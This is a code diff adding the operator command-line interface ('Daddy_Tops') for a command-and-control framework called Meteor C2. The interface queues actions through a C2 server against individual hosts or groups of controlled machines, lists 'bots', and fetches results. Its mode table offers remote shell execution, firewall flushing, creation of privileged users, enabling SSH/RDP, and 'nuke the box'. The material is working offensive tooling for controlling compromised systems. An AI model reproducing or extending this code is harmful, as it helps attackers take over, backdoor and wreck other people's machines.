@@ -156,3 +156,304 @@ func registerHostGroupReq(host string, group string) {
 	fmt.Printf("Status: %d\n", stat.GetStatus())
 	return
 }
+
+func handleActionKW(splitargs []string) string {
+	if len(splitargs) < 3 {
+		return "Error: not enough args"
+	}
+	hst := splitargs[0]
+	md := splitargs[1]
+	com := strings.Join(splitargs[2:], " ")
+	actReg := &mcs.MCS{
+		Mode:     md,
+		Args:     com,
+		Hostname: hst,
+		AuthDat:  generateAuthData(),
+	}
+	bdata, _ := proto.Marshal(actReg)
+	url := "http://" + DTSERVER + "/add/action/single"
+	resp, err := http.Post(url, "", bytes.NewBuffer(bdata))
+	if err != nil {
+		return err.Error()
+	}
+	data, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return err.Error()
+	}
+	defer resp.Body.Close()
+	stat := &mcs.MCS{}
+	proto.Unmarshal(data, stat)
+	if err != nil {
+		return err.Error()
+	}
+	if stat.GetStatus() != 200 {
+		return "Error queuing action" + string(stat.GetStatus())
+	}
+	return "Successfully queued action '" + stat.GetUuid() + "' targeting: " + hst
+}
+
+func handleGroupActionKW(splitargs []string) string {
+	if len(splitargs) < 3 {
+		return "Error: not enough args"
+	}
+	grp := splitargs[0]
+	md := splitargs[1]
+	com := strings.Join(splitargs[2:], " ")
+	actReg := &mcs.MCS{
+		Mode:      md,
+		Args:      com,
+		Groupname: grp,
+		AuthDat:   generateAuthData(),
+	}
+	bdata, _ := proto.Marshal(actReg)
+	url := "http://" + DTSERVER + "/add/action/group"
+	resp, err := http.Post(url, "", bytes.NewBuffer(bdata))
+	if err != nil {
+		return err.Error()
+	}
+	data, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return err.Error()
+	}
+	defer resp.Body.Close()
+	stat := &mcs.MCS{}
+	proto.Unmarshal(data, stat)
+	if err != nil {
+		return err.Error()
+	}
+	if stat.GetStatus() != 200 {
+		return "Error queuing action" + string(stat.GetStatus())
+	}
+	return "Successfully queued actions targeting: " + grp
+}
+
+func handleResultKW(splitargs []string) string {
+	if len(splitargs) < 1 {
+		return "Error: missing argument"
+	}
+	resReg := &mcs.MCS{
+		Uuid: splitargs[0],
+	}
+	bdata, _ := proto.Marshal(resReg)
+	url := "http://" + DTSERVER + "/list/result"
+	resp, err := http.Post(url, "", bytes.NewBuffer(bdata))
+	if err != nil {
+		return err.Error()
+	}
+	data, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return err.Error()
+	}
+	defer resp.Body.Close()
+	stat := &mcs.MCS{}
+	proto.Unmarshal(data, stat)
+	if err != nil {
+		return err.Error()
+	}
+	if stat.GetStatus() != 200 {
+		return "Error querying action"
+	}
+	return stat.GetDesc()
+}
+
+func handleListKW(splitargs []string) string {
+	if len(splitargs) < 1 {
+		return "Error: missing argument"
+	}
+	var ret string
+	switch splitargs[0] {
+	case "modes":
+		ret = handleListModes()
+	case "hosts":
+		ret = handleListHosts()
+	case "host":
+		ret = handleListHost(splitargs)
+	case "groups":
+		ret = handleListGroups()
+	case "group":
+		ret = handleListGroup(splitargs)
+	case "bots":
+		ret = handleListBots()
+	case "actions":
+		ret = handleListActions()
+	default:
+		ret = "Error: Unknown entity '" + splitargs[0] + "', cannot list"
+	}
+	return ret
+}
+
+func handleHelpKW() string {
+	ret := fmt.Sprintf(`Daddy_Tops CLI: Interactive Commander for Meteor C2
+	
+Current Server Config:
+Server: %s
+User: %s
+	
+CAPABILITY				SYNTAX
+------------------------------------------------------------------------------------------
+
+NEW ACTION:				action <target_hostname> <mode_code> <arguments>
+NEW GROUP ACTION:		gaction <target_groupname> <mode_code> <arguments>
+SHOW RESULT:			result <uuid>
+LIST AVAILABLE <X>:		list <modes/hosts/host/groups/group/bots/actions> <OPT:host/group>
+HELP MENU				help
+QUIT PROMPT				exit
+`, DTSERVER, DTUSER)
+	return ret
+}
+
+func handleExitKW() string {
+	return "Goodbye " + DTUSER + "!\n"
+}
+
+func handleListModes() string {
+	return `
+MODE	DESC			ARGS	
+-------------------------------------
+1		shell exec				<shell command>
+2		firewall flush			N/A
+3		create priv user		<username>
+4		enable SSH/RDP			N/A
+F		nuke the box			N/A
+`
+}
+
+func handleListHosts() string {
+	url := "http://" + DTSERVER + "/list/hosts"
+	resp, err := http.Get(url)
+	if err != nil {
+		return err.Error()
+	}
+	data, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return err.Error()
+	}
+	defer resp.Body.Close()
+	stat := &mcs.MCS{}
+	proto.Unmarshal(data, stat)
+	if err != nil {
+		return err.Error()
+	}
+	return stat.GetDesc()
+}
+
+func handleListHost(splitargs []string) string {
+	if len(splitargs) < 2 {
+		return "Error: not enough args"
+	}
+	hst := splitargs[1]
+	actReg := &mcs.MCS{
+		Hostname: hst,
+		AuthDat:  generateAuthData(),
+	}
+	bdata, _ := proto.Marshal(actReg)
+	url := "http://" + DTSERVER + "/list/host"
+	resp, err := http.Post(url, "", bytes.NewBuffer(bdata))
+	if err != nil {
+		return err.Error()
+	}
+	data, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return err.Error()
+	}
+	defer resp.Body.Close()
+	stat := &mcs.MCS{}
+	proto.Unmarshal(data, stat)
+	if err != nil {
+		return err.Error()
+	}
+	if stat.GetStatus() != 200 {
+		estr := fmt.Sprintf("Error listing host: %d\n", stat.GetStatus())
+		return estr
+	}
+	return stat.GetDesc()
+}
+
+func handleListGroups() string {
+	url := "http://" + DTSERVER + "/list/groups"
+	resp, err := http.Get(url)
+	if err != nil {
+		return err.Error()
+	}
+	data, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return err.Error()
+	}
+	defer resp.Body.Close()
+	stat := &mcs.MCS{}
+	proto.Unmarshal(data, stat)
+	if err != nil {
+		return err.Error()
+	}
+	return stat.GetDesc()
+}
+
+func handleListGroup(splitargs []string) string {
+	if len(splitargs) < 2 {
+		return "Error: not enough args"
+	}
+	grp := splitargs[1]
+	actReg := &mcs.MCS{
+		Groupname: grp,
+		AuthDat:   generateAuthData(),
+	}
+	bdata, _ := proto.Marshal(actReg)
+	url := "http://" + DTSERVER + "/list/group"
+	resp, err := http.Post(url, "", bytes.NewBuffer(bdata))
+	if err != nil {
+		return err.Error()
+	}
+	data, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return err.Error()
+	}
+	defer resp.Body.Close()
+	stat := &mcs.MCS{}
+	proto.Unmarshal(data, stat)
+	if err != nil {
+		return err.Error()
+	}
+	if stat.GetStatus() != 200 {
+		estr := fmt.Sprintf("Error listing group: %d\n", stat.GetStatus())
+		return estr
+	}
+	return stat.GetDesc()
+}
+
+func handleListBots() string {
+	url := "http://" + DTSERVER + "/list/bots"
+	resp, err := http.Get(url)
+	if err != nil {
+		return err.Error()
+	}
+	data, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return err.Error()
+	}
+	defer resp.Body.Close()
+	stat := &mcs.MCS{}
+	proto.Unmarshal(data, stat)
+	if err != nil {
+		return err.Error()
+	}
+	return stat.GetDesc()
+}
+
+func handleListActions() string {
+	url := "http://" + DTSERVER + "/list/actions"
+	resp, err := http.Get(url)
+	if err != nil {
+		return err.Error()
+	}
+	data, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return err.Error()
+	}
+	defer resp.Body.Close()
+	stat := &mcs.MCS{}
+	proto.Unmarshal(data, stat)
+	if err != nil {
+		return err.Error()
+	}
+	return stat.GetDesc()
+}
